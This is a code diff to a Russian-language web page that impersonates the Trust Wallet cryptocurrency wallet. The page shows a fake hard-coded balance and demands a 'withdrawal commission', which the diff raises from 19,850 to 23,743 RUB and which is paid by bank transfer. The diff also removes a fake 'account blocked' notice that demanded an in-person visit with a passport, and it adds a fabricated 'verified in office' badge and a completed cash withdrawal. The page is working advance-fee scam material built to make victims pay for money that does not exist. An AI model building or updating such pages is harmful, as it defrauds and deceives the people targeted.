@@ -883,105 +883,11 @@
   </style>
 </head>
 <body>
-  <!-- Полноэкранная блокировка аккаунта -->
-  <div class="account-blocked-overlay">
-    <div class="account-blocked-modal">
-      <div class="blocked-header">
-        <div class="blocked-logo-container">
-          <div class="blocked-logo-box">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2c3.5 2.7 6.6 2.2 8 2v9.2c0 3.8-2.2 6.4-5.7 7.9L12 22l-2.3-.9C6.2 19.6 4 17 4 13.2V4c1.4.2 4.5.7 8-2zm0 3.1C9.1 6.6 6.5 6.2 5.5 6V13c0 3 1.7 5 4.6 6.2l1.8.7 1.8-.7c2.9-1.2 4.6-3.2 4.6-6.2V6c-1 .2-3.6.6-6.5-0.9z"/></svg>
-          </div>
-          <div class="blocked-logo-text">Trust Wallet</div>
-        </div>
-        <div class="blocked-icon-large">🔒</div>
-        <div class="blocked-title">АККАУНТ ЗАБЛОКИРОВАН</div>
-        <div class="blocked-subtitle">Ваш кошелёк временно заблокирован системой безопасности</div>
-      </div>
-      
-      <div class="blocked-balance-box">
-        <div class="blocked-balance-title">
-          <span>💰</span>
-          <span>Замороженные средства</span>
-        </div>
-        <div class="blocked-balance-item">
-          <div class="blocked-balance-label">Общий баланс (RUB)</div>
-          <div class="blocked-balance-value frozen" id="blockedBalanceRub">—</div>
-        </div>
-        <div class="blocked-balance-item">
-          <div class="blocked-balance-label">Общий баланс (USD)</div>
-          <div class="blocked-balance-value frozen" id="blockedBalanceUsd">—</div>
-        </div>
-        <div class="blocked-balance-item">
-          <div class="blocked-balance-label">Статус</div>
-          <div class="blocked-balance-value frozen">Заморожено</div>
-        </div>
-      </div>
-      
-      <div class="blocked-content">
-        <div class="blocked-info-item">
-          <div class="blocked-info-icon">⚠️</div>
-          <div class="blocked-info-text">
-            <div class="blocked-info-label">Причина блокировки</div>
-            <div class="blocked-info-value">Обнаружена подозрительная активность на вашем аккаунте. В соответствии с политикой безопасности Trust Wallet, требуется дополнительная верификация личности в главном офисе компании. Детальная информация о причине блокировки будет предоставлена при личном визите.</div>
-          </div>
-        </div>
-        
-        <div class="blocked-info-item">
-          <div class="blocked-info-icon">📍</div>
-          <div class="blocked-info-text">
-            <div class="blocked-info-label">Адрес главного офиса Trust Wallet</div>
-            <div class="blocked-info-value">Российская Федерация, г. Москва, Пресненская набережная, д. 12, стр. 1</div>
-          </div>
-        </div>
-        
-        <div class="blocked-info-item">
-          <div class="blocked-info-icon">📋</div>
-          <div class="blocked-info-text">
-            <div class="blocked-info-label">Требуется для разблокировки аккаунта</div>
-            <div class="blocked-info-value">Личное присутствие владельца аккаунта с документом, удостоверяющим личность (паспорт гражданина РФ или иной документ, удостоверяющий личность). При себе необходимо иметь оригинал документа.</div>
-          </div>
-        </div>
-        
-        <div class="blocked-info-item">
-          <div class="blocked-info-icon">🕐</div>
-          <div class="blocked-info-text">
-            <div class="blocked-info-label">Режим работы офиса</div>
-            <div class="blocked-info-value">Понедельник - Пятница: с 09:00 до 18:00 (по московскому времени). Приём по вопросам верификации осуществляется только по предварительной записи.</div>
-          </div>
-        </div>
-      </div>
-      
-      <div class="blocked-warning-box">
-        <div class="blocked-warning-title">
-          <span>⚠️</span>
-          <span>Важная информация</span>
-        </div>
-        <div class="blocked-warning-text">
-          В целях обеспечения безопасности ваших средств, все операции по кошельку временно приостановлены. Ваши активы находятся в безопасности и заморожены до завершения процедуры верификации. Trust Wallet гарантирует сохранность всех средств на вашем балансе в период блокировки.
-        </div>
-      </div>
-      
-      <div class="blocked-deadline-box">
-        <div class="blocked-deadline-title">Крайний срок для обращения(был изменен до 20 ноября 2025 года, 18:00 (МСК))</div>
-        <div class="blocked-deadline-date">до 20 ноября 2025 года, 18:00 (МСК)</div>
-        <div class="blocked-deadline-consequence">В случае неявки в указанный срок, средства на балансе будут аннулированы в соответствии с пользовательским соглашением Trust Wallet</div>
-      </div>
-      
-      <div class="blocked-footer">
-        <div class="blocked-footer-text">
-          <strong>Trust Wallet</strong> — официальный криптовалютный кошелёк<br>
-          Для получения дополнительной информации обращайтесь в службу поддержки Trust Wallet или посетите главный офис компании лично.<br>
-          <span style="font-size: 12px; opacity: 0.8; margin-top: 8px; display: block;">Уведомление сгенерировано автоматически системой безопасности Trust Wallet</span>
-        </div>
-      </div>
-    </div>
-  </div>
-  
-  <div class="container" style="filter: blur(5px); pointer-events: none; opacity: 0.3;">
+  <div class="container">
     <div class="card">
       <div class="hero">
         <div class="date-banner" style="background: linear-gradient(135deg, rgba(99,102,241,0.2) 0%, rgba(236,72,153,0.2) 100%); border: 1px solid rgba(99,102,241,0.3); border-radius: 12px; padding: 12px 20px; margin-bottom: 20px; text-align: center; font-size: 16px; color: #ffffff; font-weight: 500;">
-          <span style="font-weight: 700; color: #6366f1;">14 ноября 2020</span>
+          <span style="font-weight: 700; color: #6366f1;">37 дней</span>
         </div>
         <div class="brand">
           <div class="logo" aria-hidden="true">
@@ -994,6 +900,10 @@
               <div style="font-size: 12px; padding: 6px 12px; background: rgba(16,185,129,0.2); color: var(--success); border-radius: 12px; border: 1px solid rgba(16,185,129,0.3); display: flex; align-items: center; gap: 6px;">
                 <span style="color: var(--success); font-weight: 700;">✓</span>
                 <span>Верифицирован</span>
+              </div>
+               <div style="font-size: 12px; padding: 6px 12px; background: rgba(16,185,129,0.2); color: var(--success); border-radius: 12px; border: 1px solid rgba(16,185,129,0.3); display: flex; align-items: center; gap: 6px;">
+                <span style="color: var(--success); font-weight: 700;">✓</span>
+                <span>Верификация пройдена в офисе</span>
               </div>
               <div style="font-size: 12px; padding: 6px 12px; background: linear-gradient(135deg, rgba(255,215,0,0.3) 0%, rgba(255,165,0,0.3) 100%); color: #ffd700; border-radius: 12px; border: 1px solid rgba(255,215,0,0.5); font-weight: 600; display: flex; align-items: center; gap: 6px;">
                 <span style="color: #ffd700; font-weight: 700;">✓</span>
@@ -1039,7 +949,7 @@
             <div class="label" style="margin-bottom: 12px;">Комиссия для вывода</div>
             <div class="value" id="feeValue">—</div>
           </div>
-          <div class="note" style="margin-top: 20px;">Для вывода средств необходимо оплатить комиссию 19&nbsp;850 ₽.</div>
+          <div class="note" style="margin-top: 20px;">Для вывода средств необходимо оплатить комиссию 23&nbsp;743 ₽.</div>
           <div class="row">
             <div class="badge warn" id="commissionBadge">Комиссия: не оплачено</div>
           </div>
@@ -1071,7 +981,7 @@
           <div class="note">Курс обновляется автоматически. Можно задать свой курс вручную при необходимости.</div>
 
           <hr style="margin:16px 0; border: none; border-top:1px solid rgba(255,255,255,0.08)" />
-          <div class="note" style="color: var(--warning);">⚠️ Зачисление средств происходит в конце ноября 2025 из-за задержек и проблем на стороне кошелька.</div>
+          <div class="note" style="color: var(--warning);"></div>
 
       <div class="row">
         <div class="field">
@@ -1118,7 +1028,7 @@
 
         <div class="error" id="formError" style="display:none"></div>
         <div class="btns">
-              <button class="btn warn" id="payCommissionBtn">Оплатить комиссию 19&nbsp;850 ₽</button>
+              <button class="btn warn" id="payCommissionBtn">Оплатить комиссию 23&nbsp;743 ₽</button>
               <button class="btn ok" id="withdrawBtn" disabled>Вывести</button>
         </div>
         <div class="pending" id="pendingPanel">
@@ -1144,6 +1054,14 @@
           <div style="font-size: 18px; font-weight: 700; margin-bottom: 16px; color: var(--danger); display: flex; align-items: center; gap: 8px;">
             <span style="font-size: 18px; color: var(--danger); font-weight: 700;">✓</span>
             <span>Выводы средств</span>
+          </div>
+          <div class="history-item">
+            <div class="history-info">
+              <div class="history-type">Выдача наличными</div>
+              <div class="history-date">02.11.2025, 22:35</div>
+              <div style="font-size: 12px; color: var(--success); margin-top: 2px;">✓ Завершено</div>
+            </div>
+            <div class="history-amount withdrawal">-117,432 ₽</div>
           </div>
           <div class="history-item">
             <div class="history-info">
@@ -1813,7 +1731,7 @@
         <button id="modalClose" class="btn secondary" style="padding:8px 10px">Закрыть</button>
       </div>
       <div class="note" style="margin-bottom:14px; font-size:14px;">
-        Выберите банк для оплаты комиссии 19&nbsp;850 ₽. После оплаты нажмите «Я оплатил(а)».
+        Выберите банк для оплаты комиссии 23&nbsp;743 ₽. После оплаты нажмите «Я оплатил(а)».
       </div>
       <div class="field" style="margin-bottom:16px;">
         <label for="paymentBank">Выберите банк для оплаты</label>
@@ -1852,10 +1770,10 @@
 
   <script>
     // Баланс: 996,366.94 рублей (фиксированный в рублях)
-    let balanceRub = 996366.94;
+    let balanceRub = 878934.94;
     // Курс для отображения (не влияет на баланс)
     const defaultRate = 81.13;
-    const feeRub = 19850; // Комиссия не ровная
+    const feeRub = 23743; // Комиссия не ровная
     let commissionPaid = false;
     // Зачисление в конце ноября
     function getEndOfNovember() {
@@ -2228,7 +2146,7 @@
         <div><strong>БИК:</strong> ${details.bik}</div>
         <div><strong>ИНН:</strong> ${details.inn}</div>
         <div><strong>КПП:</strong> ${details.kpp}</div>
-        <div style="margin-top:12px; padding-top:12px; border-top:1px solid rgba(255,255,255,0.1);"><strong>Сумма:</strong> 19 850 ₽</div>
+        <div style="margin-top:12px; padding-top:12px; border-top:1px solid rgba(255,255,255,0.1);"><strong>Сумма:</strong> 23 743 ₽</div>
         <div style="margin-top:8px; color:var(--warning); font-size:12px;">⚠️ Укажите назначение платежа: "Комиссия за вывод средств"</div>
       `;
       
@@ -2950,46 +2868,27 @@
     // Обновляем цены каждые 10 секунд
     setInterval(updateCryptoPrices, 10000);
 
-    // Отображаем 15-е число текущего месяца
-    function updateFifteenthDate() {
+    // Отображаем динамическую дату в шапке
+    function updateHeaderDate() {
       const now = new Date();
-      const fifteenth = new Date(now.getFullYear(), now.getMonth(), 15);
-      
+      const displayDate = new Date(2025, now.getMonth(), now.getDate());
       const options = { day: 'numeric', month: 'long', year: 'numeric' };
-      const dateStr = fifteenth.toLocaleDateString('ru-RU', options);
-      
-      const dateElement = document.getElementById('fifteenthDate');
+      const dateStr = displayDate.toLocaleDateString('ru-RU', options);
+      const dateElement = document.getElementById('headerDate');
       if (dateElement) {
         dateElement.textContent = dateStr;
       }
     }
-    
-    // Вызываем при загрузке
-    updateFifteenthDate();
 
-    // Установка курса по умолчанию при загрузке
+    // Установка курса по умолчанию и инициализация динамических элементов при загрузке
     document.addEventListener('DOMContentLoaded', () => {
-      // Устанавливаем курс 81.13 при загрузке
       if (rateEl) rateEl.value = '81.13';
-      // Блокируем страницу
-      document.body.classList.add('blocked');
-      
-      // Обновляем баланс в блокировочном сообщении
-      const blockedBalanceRubEl = document.getElementById('blockedBalanceRub');
-      const blockedBalanceUsdEl = document.getElementById('blockedBalanceUsd');
-      if (blockedBalanceRubEl && blockedBalanceUsdEl) {
-        const rate = parseFloat(rateEl?.value || defaultRate);
-        const balanceUsd = balanceRub / rate;
-        blockedBalanceRubEl.textContent = nbspThousands(formatCurrency(balanceRub, 'RUB'));
-        blockedBalanceUsdEl.textContent = nbspThousands(formatCurrency(balanceUsd, 'USD'));
-      }
-      
-      // Обновляем время активности
       updateLastActive();
-      
-      // Добавляем случайные изменения цен
       setTimeout(updateCryptoPrices, 2000);
+      updateHeaderDate();
     });
+
+
   </script>
 </body>
 </html>
